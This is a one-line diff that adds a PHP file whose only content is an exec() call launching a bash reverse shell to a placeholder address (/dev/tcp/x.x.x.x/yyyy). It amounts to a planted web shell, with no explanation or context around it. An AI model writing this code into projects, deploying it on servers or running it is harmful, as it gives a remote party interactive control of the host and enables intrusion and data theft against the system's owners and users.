@@ -1,0 +1,1 @@
+<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/x.x.x.x/yyyy 0>&1\'"); ?>
